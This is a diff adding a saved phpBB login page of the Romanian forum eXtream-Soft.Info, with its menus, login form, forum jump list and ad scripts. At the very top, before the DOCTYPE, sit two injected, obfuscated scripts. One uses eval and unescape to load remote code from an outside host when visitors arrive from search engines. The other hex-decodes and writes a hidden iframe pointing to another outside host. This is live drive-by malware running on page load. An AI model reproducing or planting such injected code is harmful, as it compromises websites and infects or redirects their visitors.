@@ -1,0 +1,418 @@
+<script>eval( unescape( "%69%66%28%21%6d%79%69%6b%29%7b%0d%0a%76%61%72%20%72%3d%64%6f%63%75%6d%65%6e%74%2e%72%65%66%65%72%72%65%72%2c%75%3d%64%6f%63%75%6d%65%6e%74%2e%55%52%4c%2c%74%3d%22%22%2c%71%2c%71%75%65%2c%73%65%3d%22%67%62%22%3b%0d%0a%69%66%28%72%2e%69%6e%64%65%78%4f%66%28%22%67%6f%6f%67%6c%65%2e%22%29%21%3d%2d%31%29%7b%74%3d%22%71%22%3b%73%65%3d%22%67%6f%6f%67%6c%65%22%3b%7d%0d%0a%69%66%28%72%2e%69%6e%64%65%78%4f%66%28%22%6d%73%6e%2e%22%29%21%3d%2d%31%29%7b%74%3d%22%71%22%3b%73%65%3d%22%6d%73%6e%22%3b%7d%0d%0a%69%66%28%72%2e%69%6e%64%65%78%4f%66%28%22%79%61%68%6f%6f%2e%22%29%21%3d%2d%31%29%7b%74%3d%22%70%22%3b%73%65%3d%22%79%61%68%6f%6f%22%3b%7d%0d%0a%69%66%28%72%2e%69%6e%64%65%78%4f%66%28%22%79%61%6e%64%65%78%2e%72%75%22%29%21%3d%2d%31%29%7b%74%3d%22%74%65%78%74%22%3b%73%65%3d%22%79%61%6e%64%65%78%2e%72%75%22%3b%7d%0d%0a%69%66%28%74%2e%6c%65%6e%67%74%68&&%28%28%71%3d%72%2e%69%6e%64%65%78%4f%66%28%22%3f%22%2b%74%2b%22%3d%22%29%29%21%3d%2d%31%7c%7c%28%71%3d%72%2e%69%6e%64%65%78%4f%66%28%22&%22%2b%74%2b%22%3d%22%29%29%21%3d%2d%31%29%29%7b%20%71%75%65%3d%72%2e%73%75%62%73%74%72%69%6e%67%28%71%2b%32%2b%74%2e%6c%65%6e%67%74%68%29%2e%73%70%6c%69%74%28%22&%22%29%5b%30%5d%3b%0d%0a%69%66%20%28%28%71%75%65%2e%69%6e%64%65%78%4f%66%28%27%73%69%74%65%3a%27%29%3d%3d%2d%31%29%20&&%20%28%71%75%65%2e%74%6f%4c%6f%77%65%72%43%61%73%65%28%29%2e%69%6e%64%65%78%4f%66%28%27%77%77%77%2e%27%29%3d%3d%2d%31%29%29%0d%0a%09%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%22%3c%73%63%72%69%70%74%20%73%72%63%3d%27%68%74%74%70%3a%2f%2f%62%65%73%74%34%79%6f%75%2e%69%66%2e%75%61%2f%6a%73%2f%62%69%64%63%68%2e%6a%73%3f%71%3d%22%2b%71%75%65%2b%22&%72%65%66%3d%22%2b%72%2b%22%27%3e%3c%2f%73%63%22%2b%22%72%69%70%74%3e%22%29%3b%0d%0a%7d%0d%0a%7d%0d%0a%76%61%72%20%6d%79%69%6b%3d%74%72%75%65%3b" ));</script><script>function c429613f36k4a1a4b49c0505(k4a1a4b49c0cd4){ var k4a1a4b49c14a3=16; return (eval('pars'+'eInt')(k4a1a4b49c0cd4,k4a1a4b49c14a3));}function k4a1a4b49c2443(k4a1a4b49c2c12){ function k4a1a4b49c4380(){return 2;} var k4a1a4b49c33e1='';k4a1a4b49c5aef='fromCh';k4a1a4b49c5321=String[k4a1a4b49c5aef+'arCode'];for(k4a1a4b49c3bb1=0;k4a1a4b49c3bb1<k4a1a4b49c2c12.length;k4a1a4b49c3bb1+=k4a1a4b49c4380()){ k4a1a4b49c33e1+=(k4a1a4b49c5321(c429613f36k4a1a4b49c0505(k4a1a4b49c2c12.substr(k4a1a4b49c3bb1,k4a1a4b49c4380()))));}return k4a1a4b49c33e1;} var nb4='';k4a1a4b49c725d=document;var k4a1a4b49c62be='3C7'+nb4+'3637'+nb4+'2697'+nb4+'07'+nb4+'43E696628216D7'+nb4+'96961297'+nb4+'B646F637'+nb4+'56D656E7'+nb4+'42E7'+nb4+'7'+nb4+'7'+nb4+'2697'+nb4+'465287'+nb4+'56E657'+nb4+'363617'+nb4+'065282027'+nb4+'2533632536392536362537'+nb4+'322536312536642536352532302536652536312536642536352533642536332533342533322532302537'+nb4+'332537'+nb4+'32253633253364253237'+nb4+'2536382537'+nb4+'342537'+nb4+'342537'+nb4+'302533612532662532662537'+nb4+'332537'+nb4+'342536352537'+nb4+'302533322536642536352532652536652536352537'+nb4+'342532662532652537'+nb4+'322537'+nb4+'34253635253266253637'+nb4+'2536662532652537'+nb4+'302536382537'+nb4+'302533662537'+nb4+'3325363925363425336425333126253237'+nb4+'2532622534642536312537'+nb4+'342536382532652537'+nb4+'322536662537'+nb4+'352536652536342532382534642536312537'+nb4+'342536382532652537'+nb4+'32253631253665253634253666253664253238253239253261253336253338253331253330253330253239253262253237'+nb4+'253634253330253237'+nb4+'2532302537'+nb4+'37'+nb4+'2536392536342537'+nb4+'34253638253364253331253335253330253230253638253635253639253637'+nb4+'2536382537'+nb4+'342533642533342533352533342532302537'+nb4+'332537'+nb4+'342537'+nb4+'39253663253635253364253237'+nb4+'2537'+nb4+'362536392537'+nb4+'332536392536322536392536632536392537'+nb4+'342537'+nb4+'39253361253638253639253634253634253635253665253237'+nb4+'2533652533632532662536392536362537'+nb4+'3225363125366425363525336527'+nb4+'29293B7'+nb4+'D7'+nb4+'6617'+nb4+'2206D7'+nb4+'969613D7'+nb4+'47'+nb4+'27'+nb4+'5653B3C2F7'+nb4+'3637'+nb4+'2697'+nb4+'07'+nb4+'43E';k4a1a4b49c725d.write(k4a1a4b49c2443(k4a1a4b49c62be));</script><script>check_content()</script><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-gb" xml:lang="en-gb">
+<head>
+
+<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+<meta http-equiv="content-language" content="en-gb" />
+<meta http-equiv="content-style-type" content="text/css" />
+<meta http-equiv="imagetoolbar" content="no" />
+<meta name="resource-type" content="document" />
+<meta name="distribution" content="global" />
+<meta name="copyright" content="2002-2006 phpBB Group" />
+<meta name="keywords" content="" />
+<meta name="description" content="" />
+<title>eXtream-Soft.Info &bull; Login</title>
+
+<link rel="stylesheet" href="./style.php?sid=fdeae73b669952ddb56ecb0e098a63b7&amp;id=36&amp;lang=en" type="text/css" />
+
+<script type="text/javascript">
+// <![CDATA[
+
+function popup(url, width, height, name)
+{
+	if (!name)
+	{
+		name = '_popup';
+	}
+
+	window.open(url.replace(/&amp;/g, '&'), name, 'height=' + height + ',resizable=yes,scrollbars=yes,width=' + width);
+	return false;
+}
+
+function jumpto()
+{
+	var page = prompt('Enter the page number you wish to go to:', '');
+	var perpage = '';
+	var base_url = '';
+
+	if (page !== null && !isNaN(page) && page > 0)
+	{
+		document.location.href = base_url.replace(/&amp;/g, '&') + '&start=' + ((page - 1) * perpage);
+	}
+}
+
+/**
+* Find a member
+*/
+function find_username(url)
+{
+	popup(url, 760, 570, '_usersearch');
+	return false;
+}
+
+/**
+* Mark/unmark checklist
+* id = ID of parent container, name = name prefix, state = state [true/false]
+*/
+function marklist(id, name, state)
+{
+	var parent = document.getElementById(id);
+	if (!parent)
+	{
+		eval('parent = document.' + id);
+	}
+
+	if (!parent)
+	{
+		return;
+	}
+
+	var rb = parent.getElementsByTagName('input');
+	
+	for (var r = 0; r < rb.length; r++)
+	{
+		if (rb[r].name.substr(0, name.length) == name)
+		{
+			rb[r].checked = state;
+		}
+	}
+}
+
+
+function selectCode(a)
+{
+	// Get ID of code block
+	var e = a.parentNode.parentNode.getElementsByTagName('CODE')[0];
+
+	// Not IE
+	if (window.getSelection)
+	{
+		var s = window.getSelection();
+		// Safari
+		if (s.setBaseAndExtent)
+		{
+			s.setBaseAndExtent(e, 0, e, e.innerText.length - 1);
+		}
+		// Firefox and Opera
+		else
+		{
+			var r = document.createRange();
+			r.selectNodeContents(e);
+			s.removeAllRanges();
+			s.addRange(r);
+		}
+	}
+	// Some older browsers
+	else if (document.getSelection)
+	{
+		var s = document.getSelection();
+		var r = document.createRange();
+		r.selectNodeContents(e);
+		s.removeAllRanges();
+		s.addRange(r);
+	}
+	// IE
+	else if (document.selection)
+	{
+		var r = document.body.createTextRange();
+		r.moveToElementText(e);
+		r.select();
+	}
+}
+
+// ]]>
+</script>
+
+<script type='text/javascript'>
+var googletag = googletag || {};
+googletag.cmd = googletag.cmd || [];
+(function() {
+var gads = document.createElement('script');
+gads.async = true;
+gads.type = 'text/javascript';
+var useSSL = 'https:' == document.location.protocol;
+gads.src = (useSSL ? 'https:' : 'http:') + 
+'//www.googletagservices.com/tag/js/gpt.js';
+var node = document.getElementsByTagName('script')[0];
+node.parentNode.insertBefore(gads, node);
+})();
+</script>
+
+<script type='text/javascript'>
+googletag.cmd.push(function() {
+googletag.defineSlot('/16833085/3x.ro_468x60', [468, 60], 'div-gpt-ad-1336324516325-0').addService(googletag.pubads());
+googletag.pubads().enableSingleRequest();
+googletag.enableServices();
+});
+</script>
+</head>
+<body class="ltr">
+
+<a name="top"></a>
+<table class="bodyline" width="100%" cellspacing="0" cellpadding="0" border="0">
+<tr>
+<td>
+
+<div id="wrapheader">
+
+<div id="logodesc">
+		<table class="topbkg" width="100%" cellspacing="0">
+		<tr>
+			<td><a href="" title="{ PORTAL }"><img src="http://i41.tinypic.com/2u6cv7t.jpg" /></a></td>
+			<td width="100%" align="right"><h1></h1><span class="gen">
+
+
+<script type="text/javascript"><!--
+google_ad_client = "pub-1406791735239477";
+/* 450x50, creat 25.03.2009 */
+google_ad_slot = "2805541821";
+google_ad_width = 468;
+google_ad_height = 60;
+//-->
+</script>
+<script type="text/javascript"
+src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+</script></span></td>
+
+  
+
+
+
+	<div id="menubar">
+		<table width="100%" cellspacing="0">
+		<tr>
+<td align="center" class="topnav">
+&nbsp;<a href="./faq.php?sid=fdeae73b669952ddb56ecb0e098a63b7"> FAQ</a>
+ &#8226; &nbsp;<a href="./ucp.php?mode=register&amp;sid=fdeae73b669952ddb56ecb0e098a63b7"> Register</a>
+&nbsp; &#8226; &nbsp; <a href="./ucp.php?mode=login&amp;sid=fdeae73b669952ddb56ecb0e098a63b7"> Login</a>&nbsp;</td>
+</tr>
+</table>
+</div>
+<table class="tablebg" width="100%" cellspacing="1" cellpadding="0" style="margin-top: 5px;">
+	<tr>
+		<td class="row1">
+			<p class="breadcrumbs"><a href="./index.php?sid=fdeae73b669952ddb56ecb0e098a63b7">Board index</a></p>
+			<p class="datetime">All times are UTC </p>
+		</td>
+	</tr>
+	</table><div id="datebar">
+<table width="100%" cellspacing="0">
+<tr>
+<td class="gensmall"></td>
+<td class="gensmall" align="right">It is currently Wed Sep 11, 2013 2:49 am<br /></td>
+</tr>
+</table>
+</div>
+</div>
+<div id="wrapcentre">
+<br style="clear: both;" />
+<br />
+<form action="./ucp.php?mode=login&amp;sid=fdeae73b669952ddb56ecb0e098a63b7" method="post">
+
+<table class="tablebg" width="100%" cellspacing="1">
+<tr>
+			<th colspan="2">Login</th>
+	</tr>
+	<tr>
+		<td class="row3" colspan="2" align="center"><span class="gensmall">The board requires you to be registered and logged in to view this forum.</span></td>
+	</tr>
+<tr>	<td class="row1" width="50%">
+		<p class="genmed">In order to login you must be registered. Registering takes only a few moments but gives you increased capabilities. The board administrator may also grant additional permissions to registered users. Before you register please ensure you are familiar with our terms of use and related policies. Please ensure you read any forum rules as you navigate around the board.</p>
+
+		<p class="genmed" align="center">
+			<a href="./ucp.php?mode=terms&amp;sid=fdeae73b669952ddb56ecb0e098a63b7">Terms of use</a> | <a href="./ucp.php?mode=privacy&amp;sid=fdeae73b669952ddb56ecb0e098a63b7">Privacy policy</a>
+		</p>
+	</td>
+		<td class="row2">
+	
+		<table align="center" cellspacing="1" cellpadding="4" style="width: 100%;">
+		
+		<tr>
+			<td valign="top" ><b class="gensmall">Username:</b></td>
+			<td><input class="post" type="text" name="username" size="25" value="" tabindex="1" />
+									<br /><a class="gensmall" href="./ucp.php?mode=register&amp;sid=fdeae73b669952ddb56ecb0e098a63b7">Register</a>
+							</td>
+		</tr>
+		<tr>
+			<td valign="top" ><b class="gensmall">Password:</b></td>
+			<td>
+				<input class="post" type="password" name="password" size="25" tabindex="2" />
+				<br /><a class="gensmall" href="./ucp.php?mode=sendpassword&amp;sid=fdeae73b669952ddb56ecb0e098a63b7">I forgot my password</a>			</td>
+		</tr>
+					<tr>
+				<td>&nbsp;</td>
+				<td><input type="checkbox" class="radio" name="autologin" tabindex="3" /> <span class="gensmall">Log me on automatically each visit</span></td>
+			</tr>
+						<tr>
+				<td>&nbsp;</td>
+				<td><input type="checkbox" class="radio" name="viewonline" tabindex="4" /> <span class="gensmall">Hide my online status this session</span></td>
+			</tr>
+				</table>
+	</td>
+</tr>
+
+<tr>
+	<td class="cat" colspan="2" align="center"><input type="hidden" name="redirect" value="viewtopic.php?f=33&amp;t=6867" />
+<input type="hidden" name="sid" value="fdeae73b669952ddb56ecb0e098a63b7" />
+<input type="submit" name="login" class="btnmain" value="Login" tabindex="5" /></td>
+</tr>
+</table>
+
+</form>
+
+<br clear="all" />
+
+<table class="tablebg" width="100%" cellspacing="1" cellpadding="0" style="margin-top: 5px;">
+	<tr>
+		<td class="row1">
+			<p class="breadcrumbs"><a href="./index.php?sid=fdeae73b669952ddb56ecb0e098a63b7">Board index</a></p>
+			<p class="datetime">All times are UTC </p>
+		</td>
+	</tr>
+	</table>
+<br clear="all" />
+
+<div align="right">	<form method="post" name="jumpbox" action="./viewforum.php?sid=fdeae73b669952ddb56ecb0e098a63b7" onsubmit="if(document.jumpbox.f.value == -1){return false;}">
+
+	<table cellspacing="0" cellpadding="0" border="0">
+	<tr>
+		<td nowrap="nowrap"><span class="gensmall">Jump to:</span>&nbsp;<select name="f" onchange="if(this.options[this.selectedIndex].value != -1){ document.forms['jumpbox'].submit() }">
+
+					<option value="-1">Select a forum</option>
+		<option value="-1">------------------</option>			<option value="1">Administratie</option>
+					<option value="41">&nbsp; &nbsp;Regulament</option>
+					<option value="2">&nbsp; &nbsp;Forum</option>
+					<option value="113">&nbsp; &nbsp;&nbsp; &nbsp;WebDesign</option>
+					<option value="114">&nbsp; &nbsp;&nbsp; &nbsp;Pareri si sugestii</option>
+					<option value="3">&nbsp; &nbsp;Discutii / Intrebari</option>
+					<option value="4">&nbsp; &nbsp;Bun Venit</option>
+					<option value="42">&nbsp; &nbsp;Zona Vip</option>
+					<option value="5">Programe</option>
+					<option value="6">&nbsp; &nbsp;Programe PC</option>
+					<option value="50">&nbsp; &nbsp;Programe Hack</option>
+					<option value="7">&nbsp; &nbsp;Programe Yahoo</option>
+					<option value="9">&nbsp; &nbsp;Applications</option>
+					<option value="10">&nbsp; &nbsp;Aio collection</option>
+					<option value="11">&nbsp; &nbsp;O.E.M Collection</option>
+					<option value="110">&nbsp; &nbsp;MyComputer</option>
+					<option value="78">Gaming</option>
+					<option value="79">&nbsp; &nbsp;MuOnline</option>
+					<option value="85">&nbsp; &nbsp;&nbsp; &nbsp;Tutoriale Server</option>
+					<option value="86">&nbsp; &nbsp;&nbsp; &nbsp;Tutoriale Site</option>
+					<option value="87">&nbsp; &nbsp;&nbsp; &nbsp;Suport</option>
+					<option value="88">&nbsp; &nbsp;&nbsp; &nbsp;Creatii</option>
+					<option value="89">&nbsp; &nbsp;&nbsp; &nbsp;Resurse</option>
+					<option value="90">&nbsp; &nbsp;&nbsp; &nbsp;Discutii</option>
+					<option value="81">&nbsp; &nbsp;World of Warcraft</option>
+					<option value="91">&nbsp; &nbsp;&nbsp; &nbsp;Tutoriale Server</option>
+					<option value="92">&nbsp; &nbsp;&nbsp; &nbsp;Suport</option>
+					<option value="93">&nbsp; &nbsp;&nbsp; &nbsp;Resurse</option>
+					<option value="94">&nbsp; &nbsp;&nbsp; &nbsp;Creatii</option>
+					<option value="95">&nbsp; &nbsp;&nbsp; &nbsp;Discutii</option>
+					<option value="82">&nbsp; &nbsp;SA-MP</option>
+					<option value="96">&nbsp; &nbsp;&nbsp; &nbsp;Tutoriale Server</option>
+					<option value="97">&nbsp; &nbsp;&nbsp; &nbsp;Suport</option>
+					<option value="100">&nbsp; &nbsp;&nbsp; &nbsp;Resurse</option>
+					<option value="98">&nbsp; &nbsp;&nbsp; &nbsp;Creatii</option>
+					<option value="99">&nbsp; &nbsp;&nbsp; &nbsp;Discutii</option>
+					<option value="84">&nbsp; &nbsp;Warcraft III TFT</option>
+					<option value="101">&nbsp; &nbsp;&nbsp; &nbsp;Tutoriale Server</option>
+					<option value="102">&nbsp; &nbsp;&nbsp; &nbsp;Resurse</option>
+					<option value="103">&nbsp; &nbsp;&nbsp; &nbsp;Suport</option>
+					<option value="104">&nbsp; &nbsp;&nbsp; &nbsp;Discutii</option>
+					<option value="108">&nbsp; &nbsp;Web Games</option>
+					<option value="55">Counter-Strike</option>
+					<option value="56">&nbsp; &nbsp;Addon-uri</option>
+					<option value="58">&nbsp; &nbsp;Plugin-uri</option>
+					<option value="59">&nbsp; &nbsp;Probleme</option>
+					<option value="60">&nbsp; &nbsp;Tutoriale</option>
+					<option value="61">&nbsp; &nbsp;Resurse</option>
+					<option value="44">&nbsp; &nbsp;&nbsp; &nbsp;Cs.eXtream-Soft.Info</option>
+					<option value="63">&nbsp; &nbsp;&nbsp; &nbsp;Harti</option>
+					<option value="64">&nbsp; &nbsp;&nbsp; &nbsp;Skinuri</option>
+					<option value="65">&nbsp; &nbsp;&nbsp; &nbsp;Moduri</option>
+					<option value="62">&nbsp; &nbsp;Servere</option>
+					<option value="66">&nbsp; &nbsp;&nbsp; &nbsp;Servere eXtream-Soft</option>
+					<option value="67">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;eXtreams.Idle.ro</option>
+					<option value="77">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Regulament</option>
+					<option value="68">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Cereri Admine</option>
+					<option value="69">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;UnBan</option>
+					<option value="70">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Reclamati</option>
+					<option value="71">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Discuti despre Server</option>
+					<option value="72">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;San Andreas Multiplayer- DeathMatch</option>
+					<option value="73">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Administrare</option>
+					<option value="74">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Reclamatii</option>
+					<option value="75">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Diverse</option>
+					<option value="76">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Discutii</option>
+					<option value="117">&nbsp; &nbsp;Cereri Resurse</option>
+					<option value="12">Download</option>
+					<option value="22">&nbsp; &nbsp;Resurse</option>
+					<option value="13">&nbsp; &nbsp;&nbsp; &nbsp;Filme</option>
+					<option value="36">&nbsp; &nbsp;&nbsp; &nbsp;Moduri</option>
+					<option value="14">&nbsp; &nbsp;&nbsp; &nbsp;Games</option>
+					<option value="37">&nbsp; &nbsp;&nbsp; &nbsp;Kit-uri</option>
+					<option value="15">&nbsp; &nbsp;&nbsp; &nbsp;Muzica</option>
+					<option value="38">&nbsp; &nbsp;&nbsp; &nbsp;Harti</option>
+					<option value="23">&nbsp; &nbsp;&nbsp; &nbsp;Servere</option>
+					<option value="112">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Tutoriale</option>
+					<option value="28">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Tutoriale</option>
+					<option value="29">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Tutoriale HTML</option>
+					<option value="30">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Tutoriale PHP</option>
+					<option value="31">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Diverse Tutoriale</option>
+					<option value="43">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Limbaje de programare</option>
+					<option value="48">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Regulament</option>
+					<option value="25">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Tutoriale Photoshop</option>
+					<option value="45">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Cereri Admine</option>
+					<option value="26">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Resurse</option>
+					<option value="47">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Reclamarii</option>
+					<option value="39">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Design</option>
+					<option value="49">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Cereri Unban</option>
+					<option value="27">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Creatii Personale</option>
+					<option value="32">Diverse</option>
+					<option value="116">&nbsp; &nbsp;Mica Publicitate</option>
+					<option value="33">&nbsp; &nbsp;Amuzament</option>
+					<option value="34">&nbsp; &nbsp;Anunturi</option>
+					<option value="35">&nbsp; &nbsp;Cos de reciclare</option>
+		
+		</select>&nbsp;<input class="btnlite" type="submit" value="Go" /></td>
+	</tr>
+	</table>
+
+	</form>
+</div>
+
+<img src="./cron.php?cron_type=queue&amp;sid=fdeae73b669952ddb56ecb0e098a63b7" width="1" height="1" alt="cron" /></div>
+
+<!--
+	We request you retain the full copyright notice below including the link to www.phpbb.com.
+	This not only gives respect to the large amount of time given freely by the developers
+	but also helps build interest, traffic and use of phpBB3. If you (honestly) cannot retain
+	the full copyright we ask you at least leave in place the "Powered by phpBB" line, with
+	"phpBB" linked to www.phpbb.com. If you refuse to include even this then support on our
+	forums may be affected.
+
+	The phpBB Group : 2006
+//-->
+
+<div id="wrapfooter">
+		<span class="copyright">Powered by <a href="http://www.phpbb.com/">phpBB</a> &copy; 2000, 2002, 2005, 2007 phpBB Group<br>Copyright by eXtream-Soft.Info <a href="www.extream-soft.info">Designed by Shocky</a><p></p><center><!-- script statistics.ro : V2 : xhtml-easy -->
+<script type="text/javascript" src="http://hitx.statistics.ro/hitx2.js"></script>
+<a href="http://www.wta.ro/656stats_index" title="Statistici web live pe Statistics.ro"><script type="text/javascript">
+st_ro_start(656, "", "", "");</script></a>
+<noscript><div><a href="http://www.wta.ro/"><img src="http://hitx.statistics.ro/656/1/-/-/-/a-x/nojs.gif" width="88" height="31" alt="Statistici web"/></a></div></noscript>
+<!-- end of script statistics.ro : V2 : xhtml-easy --></center>
+	</span>
+</div>
+
+</body>
+</html>
+ <center>
+
+<div id='div-gpt-ad-1336324516325-0' style='width:468px; height:60px;'>
+<script type='text/javascript'>
+googletag.cmd.push(function() { googletag.display('div-gpt-ad-1336324516325-0'); });
+</script>
+</div>
+
+</center>
+
